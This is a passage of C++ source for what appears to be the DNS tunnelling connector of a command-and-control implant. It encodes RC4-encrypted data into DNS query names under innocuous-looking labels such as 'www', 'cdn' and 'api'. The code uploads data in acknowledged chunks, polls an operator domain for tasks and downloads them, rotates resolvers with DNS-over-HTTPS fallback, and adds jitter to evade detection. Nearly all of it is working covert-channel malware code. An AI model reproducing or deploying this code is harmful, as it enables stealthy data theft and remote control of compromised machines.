            sessionBuf[4] = (BYTE)((plainSize >> 24) & 0xFF);
            memcpy(sessionBuf + 5, payload, payloadLen);
            EncryptRC4(sessionBuf, (int)sessionLen, sessionKey, 16);
            sendBuf = sessionBuf;
            sendLen = sessionLen;
        }
        else {
            EncryptRC4(plainData, (int)plainSize, sessionKey, 16);
            sendBuf = plainData;
            sendLen = plainSize;
        }

        this->SendData(sendBuf, sendLen);

        // Handle failed upload - store for retry
        if (!this->lastQueryOk && sendBuf && sendLen) {
            this->pendingUpload = (BYTE*)MemAllocLocal(sendLen);
            if (this->pendingUpload) {
                memcpy(this->pendingUpload, sendBuf, sendLen);
                this->pendingUploadSize = sendLen;
                this->uploadBackoffMs = 500;
                this->nextUploadAttemptTick = this->functions->GetTickCount() + this->uploadBackoffMs + (this->functions->GetTickCount() & 0x3FF);
            }
        }

        if (sessionBuf)
            MemFreeLocal((LPVOID*)&sessionBuf, sessionLen);

        if ((flags & 0x1) && payload && payload != plainData)
            MemFreeLocal((LPVOID*)&payload, payloadLen);
    }
    else {
        this->SendData(NULL, 0);
    }

    // Decrypt received data with session key
    if (this->recvSize > 0 && this->recvData) {
        DecryptRC4(this->recvData, this->recvSize, sessionKey, 16);
    }
}

void ConnectorDNS::Sleep(HANDLE wakeupEvent, ULONG workingSleep, ULONG sleepDelay, ULONG jitter, BOOL hasOutput)
{
    BOOL isBusy = this->IsBusy();
    BOOL burst = isBusy || (this->lastUpTotal >= 1024) || (this->lastDownTotal >= 1024) || hasOutput;

    if (burst && this->profile.burst_enabled) {
        ULONG burstMs = this->profile.burst_sleep;
        ULONG burstJitter = this->profile.burst_jitter;
        if (burstMs == 0)
            burstMs = 50;

        if (burstJitter > 0 && burstJitter <= 90) {
            ULONG jitterRange = (burstMs * burstJitter) / 100;
            ULONG jitterDelta = this->functions->GetTickCount() % (jitterRange + 1);
            burstMs = burstMs - (jitterRange / 2) + jitterDelta;
            if (burstMs < 10)
                burstMs = 10;
        }
        mySleep(burstMs);
        this->ResetTrafficTotals();
    }
    else {
        WaitMaskWithEvent(wakeupEvent, workingSleep, sleepDelay, jitter);
        if (burst)
            this->ResetTrafficTotals();
    }
}

void ConnectorDNS::UpdateResolvers(BYTE* resolvers)
{
    this->profile.resolvers = resolvers;
    ParseResolvers((CHAR*)resolvers);
}

void ConnectorDNS::UpdateBurstConfig(ULONG enabled, ULONG sleepMs, ULONG jitterPct)
{
    this->profile.burst_enabled = enabled;
    this->profile.burst_sleep = sleepMs;
    this->profile.burst_jitter = jitterPct;
}

void ConnectorDNS::GetBurstConfig(ULONG* enabled, ULONG* sleepMs, ULONG* jitterPct)
{
    if (enabled)   *enabled = this->profile.burst_enabled;
    if (sleepMs)   *sleepMs = this->profile.burst_sleep;
    if (jitterPct) *jitterPct = this->profile.burst_jitter;
}

void ConnectorDNS::UpdateSleepDelay(ULONG sleepSeconds)
{
    this->sleepDelaySeconds = sleepSeconds;
}

BOOL ConnectorDNS::QueryUdpWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
{
    *outSize = 0;

    if (this->resolverCount == 0)
        return FALSE;

    for (ULONG i = 0; i < this->resolverCount; ++i) {
        ULONG idx = (this->currentResolverIndex + i) % this->resolverCount;
        CHAR* resolver = this->resolverList[idx];
        if (!resolver || !*resolver) continue;

        ULONG nowTick = this->functions->GetTickCount();
        if (this->resolverDisabledUntil[idx] && nowTick < this->resolverDisabledUntil[idx])
            continue;

        if (QuerySingle(qname, resolver, qtypeStr, outBuf, outBufSize, outSize)) {
            this->currentResolverIndex = idx;
            this->resolverFailCount[idx] = 0;
            this->resolverDisabledUntil[idx] = 0;
            return TRUE;
        }

        this->resolverFailCount[idx]++;

        if (this->resolverFailCount[idx] >= kMaxFailCount) {
            ULONG backoff = 30000;
            if (this->sleepDelaySeconds > 0) {
                ULONG b = this->sleepDelaySeconds * 2000;
                if (b < 5000) b = 5000;
                if (b > 30000) b = 30000;
                backoff = b;
            }
            ULONG currentTick = this->functions->GetTickCount();
            ULONG jitter = currentTick & 0x0FFF;
            this->resolverDisabledUntil[idx] = currentTick + backoff + jitter;
            this->resolverFailCount[idx] = 0;
        }
    }
    return FALSE;
}

BOOL ConnectorDNS::QueryWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
{
    *outSize = 0;

    switch (this->dnsMode) {
        case DNS_MODE_UDP:
            return QueryUdpWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize);

        case DNS_MODE_DOH:
            return QueryDoHWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize);

        case DNS_MODE_UDP_FALLBACK:
            if (QueryUdpWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize))
                return TRUE;
            return QueryDoHWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize);

        case DNS_MODE_DOH_FALLBACK:
            if (QueryDoHWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize))
                return TRUE;
            return QueryUdpWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize);

        default:
            return QueryUdpWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize);
    }
}

// Private helper: Send heartbeat (HB) request
void ConnectorDNS::SendHeartbeat()
{
    CHAR qnameA[512];
    ULONG hbNonce = this->functions->GetTickCount() ^ (this->seq * 7919);
    BYTE hbData[kAckDataSize];
    BuildAckData(hbData, this->downAckOffset, hbNonce, this->downTaskNonce);
    EncryptRC4(hbData, kAckDataSize, this->encryptKey, 16);

    CHAR hbLabel[32] = { 0 };
    DnsCodec::Base32Encode(hbData, kAckDataSize, hbLabel, sizeof(hbLabel));

    ULONG hbLogicalSeq = this->seq + 1;
    ULONG hbWireSeq = BuildWireSeq(hbLogicalSeq, kDnsSignalBits);
    DnsCodec::BuildQName(this->sid, "hb", hbWireSeq, this->idx, hbLabel, this->domain, qnameA, sizeof(qnameA));

    BYTE ipBuf[16];
    ULONG ipSize = 0;
    if (QueryWithRotation(qnameA, "A", ipBuf, sizeof(ipBuf), &ipSize) && ipSize >= 4) {
        this->lastQueryOk = TRUE;
        this->consecutiveFailures = 0;

        // Parse HB response: [flags:1][reserved:3]
        // Flags: 0x01 = has pending tasks, 0x02 = needs_reset
        BYTE flags = ipBuf[0];
        BOOL hasPending = (flags & 0x01) != 0;
        BOOL needsReset = (flags & 0x02) != 0;

        if (needsReset) {
            // Server indicates our upload was lost - reset upload state
            this->uploadNeedsReset = TRUE;
            ResetUploadState();
        }

        if (!hasPending) {
            this->seq++;
            this->downAckOffset = 0;
            this->hasPendingTasks = FALSE;
            return;
        }
        this->hasPendingTasks = TRUE;
        this->seq++;
    }
    else {
        this->lastQueryOk = FALSE;
        this->consecutiveFailures++;

        if (this->consecutiveFailures >= 5) {
            this->hasPendingTasks = FALSE;
            this->downAckOffset = 0;
            // Don't reset downBuf/downTotal - keep download state if in progress
        }
    }
}

// Private helper: Send ACK after upload
void ConnectorDNS::SendAck()
{
    ULONG ackNonce = this->functions->GetTickCount() ^ (this->seq * 7919) ^ 0xACEACE;
    BYTE ackData[kAckDataSize];
    BuildAckData(ackData, this->downAckOffset, ackNonce, this->downTaskNonce);
    EncryptRC4(ackData, kAckDataSize, this->encryptKey, 16);

    CHAR ackLabel[32] = { 0 };
    DnsCodec::Base32Encode(ackData, kAckDataSize, ackLabel, sizeof(ackLabel));

    CHAR ackQname[256];
    DnsCodec::BuildQName(this->sid, "hb", ++this->seq, this->idx, ackLabel, this->domain, ackQname, sizeof(ackQname));

    BYTE tmp[16];
    ULONG tmpSize = 0;
    QueryWithRotation(ackQname, "A", tmp, sizeof(tmp), &tmpSize);
}

// Private helper: Finalize completed download
void ConnectorDNS::FinalizeDownload()
{
    BYTE* finalBuf = this->downBuf;
    ULONG finalSize = this->downTotal;

    if (this->downTotal > kFrameHeaderSize) {
        BYTE flags = this->downBuf[0];
        ULONG orig = 0;
        orig |= (ULONG)this->downBuf[5];
        orig |= ((ULONG)this->downBuf[6] << 8);
        orig |= ((ULONG)this->downBuf[7] << 16);
        orig |= ((ULONG)this->downBuf[8] << 24);

        if ((flags & 0x1) && orig > 0 && orig <= kMaxDownloadSize) {
            // Compressed data
            BYTE* outBuf = NULL;
            if (DnsCodec::Decompress(this->downBuf + kFrameHeaderSize, this->downTotal - kFrameHeaderSize, &outBuf, orig) && outBuf) {
                finalBuf = outBuf;
                finalSize = orig;
                MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                this->downBuf = NULL;
            }
        }
        else if (flags == 0 && orig > 0 && orig <= this->downTotal - kFrameHeaderSize) {
            // Uncompressed data
            BYTE* outBuf = (BYTE*)MemAllocLocal(orig);
            if (outBuf) {
                memcpy(outBuf, this->downBuf + kFrameHeaderSize, orig);
                finalBuf = outBuf;
                finalSize = orig;
                MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                this->downBuf = NULL;
            }
        }
    }

    this->recvData = finalBuf;
    this->recvSize = (int)finalSize;
    this->lastDownTotal = finalSize;
    this->downAckOffset = this->downTotal;
    this->downBuf = NULL;
    this->downTotal = 0;
    this->downFilled = 0;
    this->hasPendingTasks = FALSE;
}

void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
{
    ULONG pkt = this->pktSize ? this->pktSize : kDefaultPktSize;
    if (pkt > kMaxPktSize)
        pkt = kMaxPktSize;

    CHAR dataLabel[1024];
    CHAR qname[512];

    // Handle HI message (first contact)
    if (!this->hiSent && data && data_size) {
        memset(dataLabel, 0, sizeof(dataLabel));
        memset(qname, 0, sizeof(qname));

        ULONG maxBuf = pkt;
        if (maxBuf > kMaxSafeFrame)
            maxBuf = kMaxSafeFrame;
        if (data_size && maxBuf > data_size)
            maxBuf = data_size;

        BYTE* encBuf = (BYTE*)MemAllocLocal(maxBuf);
        if (!encBuf)
            return;
        memcpy(encBuf, data, maxBuf);
        if (!DnsCodec::BuildDataLabels(encBuf, maxBuf, this->labelSize, dataLabel, sizeof(dataLabel))) {
            MemFreeLocal((LPVOID*)&encBuf, maxBuf);
            return;
        }
        MemFreeLocal((LPVOID*)&encBuf, maxBuf);

        ULONG hiWireSeq = BuildWireSeq(this->seq, kDnsSignalBits);
        DnsCodec::BuildQName(this->sid, "www", hiWireSeq, this->idx, dataLabel, this->domain, qname, sizeof(qname));

        BYTE tmp[512];
        ULONG tmpSize = 0;
        this->lastQueryOk = QueryWithRotation(qname, this->qtype, tmp, sizeof(tmp), &tmpSize);
        if (this->lastQueryOk) {
            this->hiSent = TRUE;
            this->consecutiveFailures = 0;
        }
        else if (this->hiRetries > 0)
            this->hiRetries--;
        return;
    }

    // Handle data upload
    if (data && data_size) {
        this->lastQueryOk = TRUE;
        ULONG total = data_size;
        ULONG maxChunk = pkt;
        if (maxChunk <= kHeaderSize)
            maxChunk = kHeaderSize + 1;
        maxChunk -= kHeaderSize;

        if (maxChunk + kHeaderSize > kMaxSafeFrame)
            maxChunk = kMaxSafeFrame - kHeaderSize;

        if (total > kMaxUploadSize)
            total = kMaxUploadSize;

        // Reset upload tracking state
        ResetUploadState();
        this->uploadStartTime = this->functions->GetTickCount();

        ULONG seqForSend = ++this->seq;
        ULONG offset = 0;
        BOOL uploadComplete = FALSE;
        int maxUploadRetries = 5;

        while (!uploadComplete && maxUploadRetries > 0) {
            // Find next unconfirmed offset
            ULONG sendOffset = offset;
            while (sendOffset < total && IsOffsetConfirmed(sendOffset)) {
                sendOffset += maxChunk;
            }

            if (sendOffset >= total) {
                // All offsets confirmed
                uploadComplete = TRUE;
                break;
            }

            ULONG chunk = total - sendOffset;
            if (chunk > maxChunk)
                chunk = maxChunk;

            ULONG frameSize = kHeaderSize + chunk;
            BYTE* frame = (BYTE*)MemAllocLocal(frameSize);
            if (!frame)
                return;

            DNS_META_V1 meta;
            MetaV1Init(&meta);
            if (this->downAckOffset > 0) {
                meta.metaFlags |= 0x01;
                meta.downAckOffset = this->downAckOffset;
            }
            memcpy(frame, &meta, kMetaSize);
            WriteBE32(frame + kMetaSize, total);
            WriteBE32(frame + kMetaSize + 4, sendOffset);
            memcpy(frame + kHeaderSize, data + sendOffset, chunk);

            EncryptRC4(frame, frameSize, this->encryptKey, 16);

            memset(dataLabel, 0, sizeof(dataLabel));
            if (!DnsCodec::BuildDataLabels(frame, frameSize, this->labelSize, dataLabel, sizeof(dataLabel))) {
                MemFreeLocal((LPVOID*)&frame, frameSize);
                return;
            }
            MemFreeLocal((LPVOID*)&frame, frameSize);

            ULONG putWireSeq = BuildWireSeq(seqForSend, kDnsSignalBits);
            DnsCodec::BuildQName(this->sid, "cdn", putWireSeq, this->idx, dataLabel, this->domain, qname, sizeof(qname));

            BYTE tmp[512];
            ULONG tmpSize = 0;
            BOOL putOk = FALSE;
            for (int retry = 0; retry < 3 && !putOk; retry++) {
                if (retry > 0) {
                    this->functions->Sleep(100 + (this->functions->GetTickCount() % 50));
                }
                putOk = QueryWithRotation(qname, this->qtype, tmp, sizeof(tmp), &tmpSize);
            }

            if (!putOk) {
                this->lastQueryOk = FALSE;
                maxUploadRetries--;
                continue;
            }

            // Parse PUT ACK response
            ULONG nextExpected = 0;
            BOOL complete = FALSE;
            BOOL needsReset = FALSE;
            if (tmpSize >= 4 && ParsePutAckResponse(tmp, tmpSize, &nextExpected, &complete, &needsReset)) {
                if (needsReset) {
                    // Server requested upload reset - restart from beginning
                    ResetUploadState();
                    offset = 0;
                    maxUploadRetries--;
                    continue;
                }
                if (complete) {
                    uploadComplete = TRUE;
                    break;
                }
                // Mark current offset as confirmed
                MarkOffsetConfirmed(sendOffset);
                this->lastAckNextExpected = nextExpected;

                // Check if server expects a different offset (gap detected)
                if (nextExpected < sendOffset && !IsOffsetConfirmed(nextExpected))
                    // Server wants us to resend an earlier fragment
                    offset = nextExpected;
                else
                    offset = sendOffset + chunk;
            }
            else {
                // Failed to parse response, assume current offset is ok and continue
                MarkOffsetConfirmed(sendOffset);
                offset = sendOffset + chunk;
            }

            // Inter-fragment pacing
            if (this->profile.burst_enabled && this->profile.burst_sleep > 0) {
                // Burst ON: use burst_sleep (milliseconds)
                ULONG pacing = this->profile.burst_sleep;
                ULONG jitterPct = this->profile.burst_jitter;
                if (jitterPct > 0 && jitterPct <= 90) {
                    ULONG jitterRange = (pacing * jitterPct) / 100;
                    ULONG jitterDelta = this->functions->GetTickCount() % (jitterRange + 1);
                    pacing = pacing - (jitterRange / 2) + jitterDelta;
                    if (pacing < 10) pacing = 10;
                }
                this->functions->Sleep(pacing);
            }
            else if (this->sleepDelaySeconds > 0) {
                // Burst OFF: use sleep_delay (seconds -> milliseconds)
                ULONG pacing = this->sleepDelaySeconds * 1000;
                this->functions->Sleep(pacing);
            }
        }

        if (uploadComplete || offset >= total) {
            this->lastUpTotal = total;
            this->lastQueryOk = TRUE;
            this->consecutiveFailures = 0;
        }
        else {
            this->lastQueryOk = FALSE;
            this->consecutiveFailures++;

            if (this->consecutiveFailures >= 5) {
                this->hasPendingTasks = FALSE;
            }
        }

        // Send ACK if needed
        if (this->downAckOffset > 0)
            SendAck();
        return;
    }

    if (!this->hiSent && this->hiBeat && this->hiBeatSize) {
        memset(dataLabel, 0, sizeof(dataLabel));
        memset(qname, 0, sizeof(qname));

        ULONG retrySize = this->hiBeatSize;
        if (retrySize > pkt)
            retrySize = pkt;

        BYTE* encBuf = (BYTE*)MemAllocLocal(retrySize);
        if (!encBuf)
            return;
        memcpy(encBuf, this->hiBeat, retrySize);
        if (!DnsCodec::BuildDataLabels(encBuf, retrySize, this->labelSize, dataLabel, sizeof(dataLabel))) {
            MemFreeLocal((LPVOID*)&encBuf, retrySize);
            return;
        }
        MemFreeLocal((LPVOID*)&encBuf, retrySize);

        ULONG hiRetryWireSeq = BuildWireSeq(this->seq, kDnsSignalBits);
        DnsCodec::BuildQName(this->sid, "www", hiRetryWireSeq, this->idx, dataLabel, this->domain, qname, sizeof(qname));

        BYTE tmp[512];
        ULONG tmpSize = 0;
        if (QueryWithRotation(qname, this->qtype, tmp, sizeof(tmp), &tmpSize)) {
            this->hiSent = TRUE;
            this->lastQueryOk = TRUE;
            this->consecutiveFailures = 0;
        }
        else {
            this->lastQueryOk = FALSE;
            this->consecutiveFailures++;
        }
        return;
    }

    // Send heartbeat if no pending download and no pending tasks
    // Also send heartbeat if connection was lost (consecutiveFailures > 0) to recover
    if (!this->forcePoll && !this->downBuf && (!this->hasPendingTasks || this->consecutiveFailures > 0)) {
        SendHeartbeat();
        // If heartbeat indicates pending tasks, continue to API request
        if (!this->hasPendingTasks)
            return;
    }

    if (this->forcePoll)
        this->forcePoll = FALSE;

    // Handle download (GET)
    ULONG reqOffset = this->downFilled;
    ULONG nonce = this->functions->GetTickCount() ^ (this->seq << 16) ^ (reqOffset * 31337);

    BYTE reqData[kReqDataSize];
    WriteBE32(reqData, reqOffset);
    WriteBE32(reqData + 4, nonce);
    EncryptRC4(reqData, kReqDataSize, this->encryptKey, 16);

    CHAR reqLabel[24];
    memset(reqLabel, 0, sizeof(reqLabel));
    DnsCodec::Base32Encode(reqData, kReqDataSize, reqLabel, sizeof(reqLabel));

    ULONG logicalSeq = ++this->seq;
    ULONG getWireSeq = BuildWireSeq(logicalSeq, kDnsSignalBits);
    memset(qname, 0, sizeof(qname));
    DnsCodec::BuildQName(this->sid, "api", getWireSeq, this->idx, reqLabel, this->domain, qname, sizeof(qname));

    BYTE respBuf[1024];
    ULONG respSize = 0;
    if (QueryWithRotation(qname, this->qtype, respBuf, sizeof(respBuf), &respSize) && respSize > 0) {
        this->lastQueryOk = TRUE;
        this->consecutiveFailures = 0;

        // Check for "no data" response: "OK" or empty/small response
        if ((respSize == 2 && respBuf[0] == 'O' && respBuf[1] == 'K') ||
            (respSize <= 4)) {
            this->hasPendingTasks = FALSE;  // Reset flag when server says "no data"
            return;
        }

        BYTE binBuf[1024];
        int binLen = DnsCodec::Base64Decode((const CHAR*)respBuf, respSize, binBuf, sizeof(binBuf));
        if (binLen <= 0) {
            ResetDownload();
            return;
        }

        DecryptRC4(binBuf, binLen, this->encryptKey, 16);

        const ULONG headerSize = 8;
        if (binLen > (int)headerSize) {
            ULONG total = ReadBE32(binBuf);
            ULONG offset = ReadBE32(binBuf + 4);
            ULONG chunkLen = binLen - headerSize;

            if (total > kMaxDownloadSize) {
                ResetDownload();
                return;
            }

            if (total > 0 && total <= kMaxDownloadSize && offset < total) {
                // Extract task nonce from first chunk (if this is offset 0)
                ULONG chunkTaskNonce = 0;
                if (offset == 0 && chunkLen >= 9)
                    chunkTaskNonce = ReadLE32(binBuf + headerSize + 1);

                // Determine if this is a new task or continuation
                BOOL isNewTask = FALSE;
                BOOL isValidContinuation = FALSE;

                if (!this->downBuf || this->downTotal == 0) {
                    // No current download - this must be a new task
                    isNewTask = TRUE;
                }
                else if (this->downTotal != total) {
                    // Different total size - definitely a new task
                    isNewTask = TRUE;
                }
                else if (offset == 0 && chunkTaskNonce != 0) {
                    // Offset 0 chunk with nonce - check if it's a new task
                    if (chunkTaskNonce != this->downTaskNonce) {
                        // Different nonce - new task
                        isNewTask = TRUE;
                    }
                    else if (this->downFilled > 0) {
                        // Same nonce but we already have data - this is a retransmission
                        // Ignore if we've already acked this
                        if (this->downAckOffset > 0) {
                            return;
                        }
                    }
                }
                else {
                    // Continuation chunk - validate offset
                    isValidContinuation = TRUE;
                }

                // Handle offset mismatch for continuation chunks
                if (isValidContinuation && offset != reqOffset) {
                    // Server sent different offset than we requested
                    if (offset == 0 && chunkLen >= 9) {
                        // Server is starting a new task - extract and check nonce
                        ULONG newNonce = ReadLE32(binBuf + headerSize + 1);

                        if (newNonce != 0 && newNonce != this->downTaskNonce) {
                            // New task started - reset and accept
                            ResetDownload();
                            isNewTask = TRUE;
                            chunkTaskNonce = newNonce;
                        }
                        else {
                            // Same task but server is resending from start - something wrong
                            // Request the offset we actually need by returning
                            return;
                        }
                    }
                    else if (offset < reqOffset) {
                        // Server sent an earlier offset - data we already have, ignore
                        return;
                    }
                    else {
                        // Server sent a later offset - we're missing data, request resend
                        // by not processing this and waiting for correct offset
                        return;
                    }
                }

                // Initialize new download buffer if needed
                if (isNewTask) {
                    if (this->downBuf && this->downTotal)
                        MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);

                    this->downBuf = (BYTE*)MemAllocLocal(total);
                    if (!this->downBuf) {
                        this->downTotal = 0;
                        this->downFilled = 0;
                        return;
                    }
                    this->downTotal = total;
                    this->downFilled = 0;
                    this->downAckOffset = 0;
                    if (offset == 0 && chunkTaskNonce != 0)
                        this->downTaskNonce = chunkTaskNonce;

                    // For new task, we must start at offset 0
                    if (offset != 0)
                        return;
                }

                // Copy chunk data to buffer
                ULONG end = offset + chunkLen;
                if (end > total)
                    end = total;
                ULONG n = end - offset;
                memcpy(this->downBuf + offset, binBuf + headerSize, n);

                // Update progress
                if (offset + n > this->downFilled)
                    this->downFilled = offset + n;
                this->downAckOffset = this->downFilled;

                if (this->downFilled >= this->downTotal)
                    FinalizeDownload();
                return;
            }
        }

        if (binLen > (int)headerSize) {
            ResetDownload();
            return;
        }

        this->recvData = (BYTE*)MemAllocLocal(binLen);
        if (!this->recvData)
            return;
        memcpy(this->recvData, binBuf, binLen);
        this->recvSize = (int)binLen;
    }
    else {
        // GET request failed - increment failure counter
        this->lastQueryOk = FALSE;
        this->consecutiveFailures++;

        if (this->consecutiveFailures >= 5) {
            this->hasPendingTasks = FALSE;
            this->downAckOffset = 0;
        }
    }
}

BYTE* ConnectorDNS::RecvData()
{
    return this->recvData;
}

int ConnectorDNS::RecvSize()
{
    return this->recvSize;
}

void ConnectorDNS::RecvClear()
{
    if (this->recvData) {
        MemFreeLocal((LPVOID*)&this->recvData, (ULONG)this->recvSize);
        this->recvData = NULL;
        this->recvSize = 0;
    }
}

BOOL ConnectorDNS::IsBusy() const
{
    return (this->downBuf != NULL) || this->hasPendingTasks;
}